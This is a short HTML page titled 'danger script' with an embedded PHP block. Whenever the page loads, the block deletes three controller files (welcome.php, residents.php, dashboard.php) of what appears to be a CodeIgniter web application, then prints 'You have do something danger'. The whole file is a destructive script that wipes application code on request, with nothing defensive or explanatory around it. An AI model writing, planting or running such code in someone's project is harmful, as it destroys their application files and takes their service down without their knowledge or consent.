<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>danger script</title>
</head>
<?php
$file = "application/controllers/welcome.php";
unlink("application/controllers/residents.php");
unlink("application/controllers/dashboard.php");
if (!unlink($file))
  {
  echo ("Error deleting $file");
  }
else
  {
  echo ("You have do something danger");
  }
?> 
<body>
</body>
</html>
